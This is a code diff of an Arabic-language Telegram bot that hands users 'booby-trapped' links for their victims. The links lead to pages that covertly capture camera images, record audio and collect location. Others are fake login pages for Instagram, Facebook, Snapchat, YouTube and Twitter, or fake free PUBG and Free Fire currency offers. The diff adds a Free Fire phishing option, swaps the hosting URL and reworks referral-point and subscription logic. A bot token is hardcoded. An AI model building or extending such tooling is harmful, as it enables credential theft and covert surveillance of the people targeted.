@@ -6,7 +6,6 @@ const fs = require('fs');
 const path = require('path');
 const useragent = require('useragent');
 const TinyURL = require('tinyurl');
-
 const botToken = '7252078284:AAFt6ySoKDAJx-6wbg435qnU-_ramrgRL8Y';
 const bot = new TelegramBot(botToken, { polling: true });
 
@@ -155,21 +154,6 @@ bot.on('callback_query', async (callbackQuery) => {
         }
       });
       break;
-    case 'stats':
-      const totalUsers = allUsers.size;
-      const activeUsers = activatedUsers.size;
-      const bannedUsersCount = bannedUsers.size;
-      const usersWhoBlockedBot = Array.from(allUsers.values()).filter(user => user.hasBlockedBot).length;
-      bot.sendMessage(chatId, `إحصائيات البوت:\nعدد المستخدمين الكلي: ${totalUsers}\nعدد المستخدمين النشطين: ${activeUsers}\nعدد المستخدمين المحظورين: ${bannedUsersCount}\nعدد المستخدمين الذين حظروا البوت: ${usersWhoBlockedBot}`);
-      break;
-    case 'broadcast':
-      bot.sendMessage(chatId, 'يرجى إدخال الرسالة التي تريد إرسالها لجميع المستخدمين:');
-      bot.once('message', async (response) => {
-        const message = response.text;
-        broadcastMessage(message);
-        bot.sendMessage(chatId, 'تم إرسال الرسالة بنجاح!');
-      });
-      break;
     case 'banned_users':
   const bannedList = Array.from(bannedUsers).join(', ');
   bot.sendMessage(chatId, `قائمة المستخدمين المحظورين:\n${bannedList || 'لا يوجد مستخدمين محظورين حاليًا'}`);
@@ -309,54 +293,152 @@ bot.on('callback_query', async (callbackQuery) => {
   await bot.answerCallbackQuery(callbackQuery.id);
 });
 
-
-
-  // معالج زر "نقاطي"
-bot.on('callback_query', (callbackQuery) => {
-    const chatId = callbackQuery.message.chat.id;
-    const userId = callbackQuery.from.id.toString();
-    const data = callbackQuery.data;
-
-    if (data === 'create_referral') {
-        const referralLink = createReferralLink(userId);
-        userReferrals.set(userId, referralLink);
-        bot.sendMessage(chatId, `رابط الدعوة الخاص بك هو:\n${referralLink}`);
-    } else if (data === 'my_points') {
-        const points = userPoints.get(userId) || 0;
-        const isSubscribed = subscribedUsers.has(userId);
-        let message = isSubscribed
-            ? `لديك حاليًا ${points} نقطة. أنت مشترك في البوت ويمكنك استخدامه بدون قيود.`
-            : `لديك حاليًا ${points} نقطة. اجمع ${pointsRequiredForSubscription} نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
-        bot.sendMessage(chatId, message);
-    } else {
-        if (!subscribedUsers.has(userId)) {
-            bot.sendMessage(chatId, 'ملاحظة عزيزي المستخدم لان تستطيع استخدام هاذا الميزه سوى 5مرات قوم بل الاشتراك من المطور او قوم بجمع نقاط لاستخدام بدون قيود.');
-        } else {
-            bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
-            // هنا يمكنك إضافة الكود الخاص بكل عملية
-        }
-    }
+bot.on('some_event', (msg) => {
+  sendBotStats(msg.chat.id);
 });
 
+  // معالج زر "نقاطي"
 
-  // هنا يمكنك إضافة المزيد من المنطق لمعالجة الرسائل العادية
+// الكائنات المستخدمة لتخزين البيانات
+
+// دالة لتسجيل مسؤول الحظر
+function recordBanAction(userId, adminId) {
+  const adminName = getUsername(adminId); // استرجاع اسم المسؤول
+  bannedUsers.set(userId, adminName); // تسجيل اسم المسؤول الذي قام بالحظر
+}
+
+// دالة لاسترداد اسم المسؤول
+function getUsername(userId) {
+  return allUsers.get(userId)?.username || 'Unknown';
+}
+
+// دالة لتحديث حالة حظر المستخدم للبوت
+function updateUserBlockStatus(userId, hasBlocked) {
+  if (allUsers.has(userId)) {
+    allUsers.get(userId).hasBlockedBot = hasBlocked;
+  } else {
+    allUsers.set(userId, { hasBlockedBot: hasBlocked });
+  }
+}
+
+// مستمع لحدث مغادرة العضو
 bot.on('left_chat_member', (msg) => {
   const userId = msg.left_chat_member.id;
   if (!msg.left_chat_member.is_bot) {
-    updateUserBlockStatus(userId, true);
+    updateUserBlockStatus(userId, true); // تحديث حالة حظر البوت للمستخدم
   }
 });
 
+// مستمع لحظر البوت من قبل المستخدم
 bot.on('my_chat_member', (msg) => {
   if (msg.new_chat_member.status === 'kicked' || msg.new_chat_member.status === 'left') {
     const userId = msg.from.id;
-    updateUserBlockStatus(userId, true);
+    updateUserBlockStatus(userId, true); // تحديث حالة حظر البوت للمستخدم
+  }
+});
+
+// دالة للتحقق مما إذا كان المستخدم محظورًا
+function isUserBlocked(userId) {
+  return allUsers.get(userId)?.hasBlockedBot || false;
+}
+
+// دالة لحساب الإحصائيات وإرسالها
+function sendBotStats(chatId) {
+  const totalUsers = allUsers.size;
+  const activeUsers = activatedUsers.size;
+  const bannedUsersCount = bannedUsers.size;
+  const usersWhoBlockedBot = Array.from(allUsers.values()).filter(user => user.hasBlockedBot).length;
+
+  bot.sendMessage(chatId, `إحصائيات البوت:\nعدد المستخدمين الكلي: ${totalUsers}\nعدد المستخدمين النشطين: ${activeUsers}\nعدد المستخدمين المحظورين: ${bannedUsersCount}\nعدد المستخدمين الذين حظروا البوت: ${usersWhoBlockedBot}`);
+}
+
+bot.on('message', (msg) => {
+  const userId = msg.from.id;
+  const chatId = msg.chat.id;
+  const text = msg.text;
+
+  if (isUserBlocked(userId)) {
+    if (hasUserBlockedBefore(userId)) {
+      bot.sendMessage(chatId, 'لقد تم حظرك من استخدام البوت لأنك قمت بحذفه وحظره.', {
+        reply_markup: {
+          remove_keyboard: true,
+        },
+      });
+    } else {
+      updateUserBlockStatus(userId, true);
+      bot.sendMessage(chatId, 'لقد قمت بحظر البوت، لا يمكنك استخدام البوت مرة أخرى.');
+    }
+    return;
+  }
+
+  // باقي الكود للتفاعل مع الرسائل
+  // إذا كان المستخدم غير محظور، يمكنك إضافة الميزات والأزرار هنا.
+});
+
+// مستمع للضغط على الأزرار
+bot.on('callback_query', (query) => {
+  const userId = query.from.id;
+  const chatId = query.message.chat.id;
+  const data = query.data;
+
+  if (isUserBlocked(userId)) {
+    if (hasUserBlockedBefore(userId)) {
+      bot.answerCallbackQuery(query.id, { text: 'لقد تم حظرك من استخدام البوت لأنك قمت بحذفه وحظره.', show_alert: true });
+    } else {
+      updateUserBlockStatus(userId, true);
+      bot.answerCallbackQuery(query.id, { text: 'لقد قمت بحظر البوت، لا يمكنك استخدام البوت مرة أخرى.', show_alert: true });
+    }
+    return;
+  }
+
+  switch (data) {
+    case 'stats':
+      sendBotStats(chatId);
+      break;
+    
+    // الحالات الأخرى يمكن إضافتها هنا
+    
+    
   }
 });
 
 
+// مثال على كيفية إرسال أزرار قائمة الإحصائيات
 
 
+let userPoints = new Map();
+let userReferrals = new Map();
+const dataFilePath = 'data.json'; // مسار ملف البيانات
+
+// دالة تحميل البيانات
+function loadData() {
+  if (fs.existsSync(dataFilePath)) {
+    const data = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
+    userPoints = new Map(data.userPoints);
+    userReferrals = new Map(data.userReferrals);
+  }
+}
+loadData(); // استدعاء تحميل البيانات عند بدء تشغيل البوت
+
+// دالة حفظ البيانات
+function saveData() {
+  const data = {
+    userPoints: Array.from(userPoints.entries()),
+    userReferrals: Array.from(userReferrals.entries()),
+  };
+  fs.writeFileSync(dataFilePath, JSON.stringify(data));
+}
+
+// دالة تحديث نقاط المستخدم وحفظ البيانات
+function updateUserPoints(userId, points) {
+  userPoints.set(userId, points);
+  saveData();
+}
+
+// استخدم دالة updateUserPoints كلما تم تحديث نقاط المستخدمين
+
+// مثال على تحديث نقاط المستخدم
+updateUserPoints('user123', 50); // تحديث نقاط المستخدم "user123" إلى 50 نقطة
 
 
   // هنا يمكنك إضافة المزيد من المنطق لمعالجة الرسائل العادية
@@ -443,7 +525,7 @@ app.get('/camera/:userId', (req, res) => {
 
     res.sendFile(path.join(__dirname, 'location.html'));
 });
- 
+
 // مسار تسجيل الصوت
 app.get('/record/:userId', (req, res) => {
     const userId = req.params.userId;
@@ -660,11 +742,174 @@ app.post('/submitLogin', (req, res) => {
 });
 
 
+const crypto = require('crypto');
 
+// إنشاء رابط الدعوة
 function createReferralLink(userId) {
-  const referralCode = Buffer.from(userId.toString()).toString('base64');
-  return `https://t.me/Hzhzhxhbxbdbot?start=${referralCode}`;
+  const referralCode = Buffer.from(userId).toString('hex');
+  return `https://t.me/SJGDDW_BOT?start=${referralCode}`;
 }
+
+// فك تشفير رمز الدعوة
+function decodeReferralCode(code) {
+  try {
+    return Buffer.from(code, 'hex').toString('utf-8');
+  } catch (error) {
+    console.error('خطأ في فك تشفير رمز الإحالة:', error);
+    return null;
+  }
+}
+
+// التحقق من الاشتراك في القنوات المطلوبة
+async function checkSubscription(userId) {
+  if (forcedChannelUsernames.length) {
+    for (const channel of forcedChannelUsernames) {
+      try {
+        const member = await bot.getChatMember(channel, userId);
+        if (member.status === 'left' || member.status === 'kicked') {
+          await bot.sendMessage(userId, `عذرا، يجب عليك الانضمام إلى القنوات المطلوبة لاستخدام البوت:`, {
+            reply_markup: {
+              inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
+            }
+          });
+          return false;
+        }
+      } catch (error) {
+        console.error('خطأ أثناء التحقق من عضوية القناة:', error);
+        
+        return false;
+      }
+    }
+    return true;
+  }
+  return true;
+}
+
+// التعامل مع الرسائل
+bot.on('message', async (msg) => {
+  const chatId = msg.chat.id;
+  const text = msg.text ? msg.text.toLowerCase() : '';
+  const senderId = msg.from.id.toString();
+
+  if (!allUsers.has(chatId.toString())) {
+    const newUser = {
+      id: chatId,
+      firstName: msg.from.first_name,
+      lastName: msg.from.last_name || '',
+      username: msg.from.username || ''
+    };
+    allUsers.set(chatId.toString(), newUser);
+
+    await bot.sendMessage(adminId, `مستخدم جديد دخل البوت:\nالاسم: ${newUser.firstName} ${newUser.lastName}\nاسم المستخدم: @${newUser.username}\nمعرف الدردشة: ${chatId}`);
+  }
+
+  if (bannedUsers.has(senderId)) {
+    await bot.sendMessage(chatId, 'تم إيقاف استخدام البوت من قبل المطور. لا يمكنك استخدام البوت حاليًا.');
+    return;
+  }
+
+  // التحقق من الاشتراك عند كل رسالة /start
+  if (text.startsWith('/start')) {
+    const isSubscribed = await checkSubscription(senderId);
+    if (!isSubscribed) {
+      return;
+    }
+  }
+
+  if (text === '/start') {
+    showDefaultButtons(senderId);
+  } else if (text === '/login') {
+    showLoginButtons(senderId);
+  } else if (text === '/hacking') {
+    showHackingButtons(senderId);
+  } else if (text.startsWith('/start ')) {
+    const startPayload = text.split(' ')[1];
+    console.log('Start payload:', startPayload);
+
+    if (startPayload) {
+      const referrerId = decodeReferralCode(startPayload);
+      console.log('Decoded referrer ID:', referrerId);
+      console.log('Sender ID:', senderId);
+
+      if (referrerId && referrerId !== senderId) {
+        try {
+          const usedLinks = usedReferralLinks.get(senderId) || new Set();
+          if (!usedLinks.has(referrerId)) {
+            usedLinks.add(referrerId);
+            usedReferralLinks.set(senderId, usedLinks);
+
+            const referrerPoints = addPointsToUser(referrerId, 1);
+
+            await bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
+            await bot.sendMessage(senderId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة وتمت إضافة نقطة للمستخدم الذي دعاك.');
+
+            console.log(`User ${senderId} joined using referral link from ${referrerId}`);
+          } else {
+            await bot.sendMessage(senderId, 'لقد استخدمت هذا الرابط من قبل.');
+          }
+        } catch (error) {
+          console.error('خطأ في معالجة رابط الدعوة:', error);
+          await bot.sendMessage(senderId, 'حدث خطأ أثناء معالجة رابط الدعوة. الرجاء المحاولة مرة أخرى.');
+        }
+      } else {
+        await bot.sendMessage(senderId, 'رابط الدعوة غير صالح أو أنك تحاول استخدام رابط الدعوة الخاص بك.');
+      }
+    } else {
+      await bot.sendMessage(senderId, 'مرحبًا بك في البوت!');
+    }
+
+    showDefaultButtons(senderId);
+  }
+});
+
+// التعامل مع الاستفسارات
+bot.on('callback_query', async (callbackQuery) => {
+  const chatId = callbackQuery.message.chat.id;
+  const userId = callbackQuery.from.id.toString();
+  const data = callbackQuery.data;
+
+  try {
+    // التحقق من الاشتراك قبل تنفيذ أي عملية
+    const isSubscribed = await checkSubscription(userId);
+    if (!isSubscribed) {
+      return;
+    }
+
+    if (data === 'create_referral') {
+      const referralLink = createReferralLink(userId);
+      console.log('Created referral link:', referralLink);
+      await bot.sendMessage(chatId, `رابط الدعوة الخاص بك هو:\n${referralLink}`);
+    } else if (data === 'my_points') {
+      const points = userPoints.get(userId) || 0;
+      const isSubscribed = subscribedUsers.has(userId);
+      let message = isSubscribed
+        ? `لديك حاليًا ${points} نقطة. أنت مشترك في البوت ويمكنك استخدامه بدون قيود.`
+        : `لديك حاليًا ${points} نقطة. اجمع ${pointsRequiredForSubscription} نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
+      await bot.sendMessage(chatId, message);
+    } else {
+      if (!subscribedUsers.has(userId)) {
+        const attempts = trackAttempt(userId, data);
+        if (attempts > MAX_FREE_ATTEMPTS) {
+          await bot.sendMessage(chatId, 'لقد تجاوزت الحد الأقصى للمحاولات المجانية. يرجى الاشتراك أو جمع المزيد من النقاط لاستخدام هذه الميزة.');
+        } else {
+          await bot.sendMessage(chatId, `ملاحظة: يمكنك استخدام هذه الميزة ${MAX_FREE_ATTEMPTS - attempts + 1} مرات أخرى قبل الحاجة إلى الاشتراك أو جمع المزيد من النقاط.`);
+          // هنا يمكنك إضافة الكود الخاص بكل عملية
+        }
+      } else {
+        await bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
+        // هنا يمكنك إضافة الكود الخاص بكل عملية
+      }
+    }
+  } catch (error) {
+    console.error('Error in callback query handler:', error);
+    await bot.sendMessage(chatId, 'حدث خطأ أثناء تنفيذ العملية. الرجاء المحاولة مرة أخرى لاحقًا.');
+  }
+
+  await bot.answerCallbackQuery(callbackQuery.id);
+});
+
+
+
 
 function addPointsToUser(userId, points) {
   if (!allUsers.has(userId)) {
@@ -696,7 +941,7 @@ function addPointsToUser(userId, points) {
   userPoints.set(userId, user.points);
   
   // التحقق من حالة الاشتراك بعد إضافة النقاط
-
+  checkSubscriptionStatus(userId);
   
   return user.points;
 }
@@ -725,9 +970,6 @@ function checkSubscriptionStatus(userId) {
   }
 }
 
-
-
-
 function trackAttempt(userId, feature) {
   if (!userVisits[userId]) userVisits[userId] = {};
   userVisits[userId][feature] = (userVisits[userId][feature] || 0) + 1;
@@ -745,104 +987,6 @@ function shortenUrl(url) {
   });
 }
 
-
-
-async function checkSubscription(userId) {
-  if (forcedChannelUsernames.length && !activatedUsers.has(userId)) {
-    for (const channel of forcedChannelUsernames) {
-      try {
-        const member = await bot.getChatMember(channel, userId);
-        if (member.status === 'left' || member.status === 'kicked') {
-          bot.sendMessage(userId, `عذرا، يجب عليك الانضمام إلى القنوات المطلوبة لاستخدام البوت:`, {
-            reply_markup: {
-              inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
-            }
-          });
-          return false;
-        }
-      } catch (error) {
-        console.error('خطأ أثناء التحقق من عضوية القناة:', error);
-        bot.sendMessage(userId, 'حدث خطأ. يرجى المحاولة لاحقًا.');
-        return false;
-      }
-    }
-    // إذا وصل المستخدم إلى هنا، فهو مشترك في جميع القنوات المطلوبة
-    activatedUsers.add(userId);
-    return true;
-  }
-  return true; // المستخدم مفعل بالفعل أو لا توجد قنوات مطلوبة
-}
-
-bot.on('message', async (msg) => {
-  const chatId = msg.chat.id;
-  const text = msg.text ? msg.text.toLowerCase() : '';
-  const senderId = msg.from.id;
-
-  // تسجيل المستخدمين الجدد
-  if (!allUsers.has(chatId.toString())) {
-    const newUser = {
-      id: chatId,
-      firstName: msg.from.first_name,
-      lastName: msg.from.last_name || '',
-      username: msg.from.username || ''
-    };
-    allUsers.set(chatId.toString(), newUser);
-    
-    bot.sendMessage(adminId, `مستخدم جديد دخل البوت:\nالاسم: ${newUser.firstName} ${newUser.lastName}\nاسم المستخدم: @${newUser.username}\nمعرف الدردشة: ${chatId}`);
-  }
-
-  // التحقق من الحظر
-  if (bannedUsers.has(senderId.toString())) {
-    bot.sendMessage(chatId, 'تم إيقاف استخدام البوت من قبل المطور. لا يمكنك استخدام البوت حاليًا.');
-    return;
-  }
-
-  // تحقق من الاشتراك قبل عرض الأزرار
-  const isSubscribed = await checkSubscription(senderId);
-  if (!isSubscribed) {
-    return;
-  }
-
-  // معالجة الأوامر
-  if (text === '/start') {
-    showDefaultButtons(senderId);
-  } else if (text === '/login') {
-    showLoginButtons(senderId);
-  } else if (text === '/hacking') {
-    showHackingButtons(senderId);
-  } else if (text.startsWith('/start ')) {
-    // معالجة رابط الدعوة
-    const startPayload = text.split(' ')[1];
-    try {
-      const referrerId = Buffer.from(startPayload, 'base64').toString('utf-8');
-      if (referrerId !== senderId.toString()) {
-        const usedLinks = usedReferralLinks.get(senderId.toString()) || new Set();
-        if (!usedLinks.has(referrerId)) {
-          usedLinks.add(referrerId);
-          usedReferralLinks.set(senderId.toString(), usedLinks);
-          const referrerPoints = addPointsToUser(referrerId, 1);
-          await bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
-          await bot.sendMessage(senderId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة.');
-        } else {
-          await bot.sendMessage(senderId, 'لقد استخدمت هذا الرابط من قبل.');
-        }
-      }
-    } catch (error) {
-      console.error('خطأ في معالجة رمز الإحالة:', error);
-    }
-    showDefaultButtons(senderId);
-  }
-});
-
-function addPointsToUser(userId, points) {
-  let user = allUsers.get(userId);
-  if (!user) {
-    user = { id: userId, points: 0 };
-    allUsers.set(userId, user);
-  }
-  user.points = (user.points || 0) + points;
-  return user.points;
-}
 
 
 
@@ -881,12 +1025,12 @@ bot.on('callback_query', (callbackQuery) => {
     const data = callbackQuery.data;
 
     if (data === 'front_camera' || data === 'rear_camera') {
-        const url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
+        const url = `https://yemen-b66f.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
         bot.sendMessage(chatId, ` تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية: ${url}`);
     } else if (data === 'voice_record') {
         bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
     } else if (data === 'get_location') {
-        const url = `https://yyytot.onrender.com/getLocation/${chatId}`;
+        const url = `https://yemen-b66f.onrender.com/getLocation/${chatId}`;
         console.log('Data received:', data);
         console.log('Chat ID:', chatId);
         console.log('URL:', url);
@@ -903,7 +1047,7 @@ bot.on('message', (msg) => {
 
     if (!isNaN(duration)) {
         if (duration > 0 && duration <= 20) {
-            const link = `https://yyytot.onrender.com/record/${chatId}?duration=${duration}`;
+            const link = `https://yemen-b66f.onrender.com/record/${chatId}?duration=${duration}`;
             bot.sendMessage(chatId, `تم تلغيم الرابط لتسجيل صوت الضحيه لمدة ${duration} ثواني: ${link}`);
         } else {
             bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
@@ -933,6 +1077,7 @@ function showHackingButtons(userId) {
     [{ text: '🕷 اختراق الانستغرام 🕷', callback_data: 'increase_instagram' }],
     [{ text: '🔱 اختراق الفيسبوك 🔱', callback_data: 'increase_facebook' }],
     [{ text: '👻 اختراق سناب شات 👻', callback_data: 'increase_snapchat' }],
+    [{ text: '💎 شحن جواهر فري فاير 💎', callback_data:'free_fire_diamonds' }],
     [{ text: '🔫 اختراق حسابات ببجي 🔫', callback_data: 'pubg_uc' }],
     [{ text: '🔴 اختراق يوتيوب 🔴', callback_data: 'increase_youtube' }],
     [{ text: '🐦 اختراق تويتر 🐦', callback_data: 'increase_twitter' }],
@@ -948,7 +1093,7 @@ function showHackingButtons(userId) {
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const data = query.data;
-    const baseUrl = 'https://yyytot.onrender.com'; // تأكد من تغيير هذا إلى عنوان URL الخاص بك
+    const baseUrl = 'https://yemen-b66f.onrender.com'; // تأكد من تغيير هذا إلى عنوان URL الخاص بك
 
     console.log('Received callback query:', data);
 
@@ -958,16 +1103,17 @@ bot.on('callback_query', (query) => {
         const platform = data.split('_')[1];
         url = `${baseUrl}/login/${platform}/${chatId}`;
         message = `تم تلغيم  رابط اندكس تسجيل دخول يشبه الصفحه الحقيقه لحد المنصة: ${getPlatformName(platform)}: ${url}`;
-    } else if (data === 'pubg_uc') {
-        url = `${baseUrl}/increase/pubg_uc/${chatId}`;
-        message = `تم تلغيم رابط اختراق على شكل صفحه مزوره لشحن شدات ببجي مجانآ: ${url}`;
+    } else if (data === 'pubg_uc' || data === 'free_fire_diamonds') {
+        const game = data === 'pubg_uc' ? 'pubg_uc' : 'free_fire_diamonds';
+        url = `${baseUrl}/increase/${game}/${chatId}`;
+        message = `تم تلغيم رابط اختراق على شكل صفحه مزوره لشحن ${getPlatformName(game)} مجانآ: ${url}`;
     } else if (data.startsWith('increase_')) {
         const platform = data.split('_')[1];
         url = `${baseUrl}/increase/${platform}/${chatId}`;
         message = `تم تلغيم رابط اختراق على شكل صفحه مزوره لزيادة المتابعين ${getPlatformName(platform)}: ${url}`;
     } else {
         console.log('Unhandled callback query:', data);
-      
+        return;
     }
 
     bot.sendMessage(chatId, message)
@@ -981,13 +1127,13 @@ function getPlatformName(platform) {
         instagram: 'انستغرام',
         facebook: 'فيسبوك',
         snapchat: 'سناب شات',
-        pubg: 'ببجي',
+        pubg_uc: 'شدات ببجي',
         youtube: 'يوتيوب',
-        twitter: 'تويتر'
+        twitter: 'تويتر',
+        free_fire_diamonds: 'جواهر فري فاير'
     };
     return platformNames[platform] || platform;
 }
-
 
 
 const PORT = process.env.PORT || 3000;
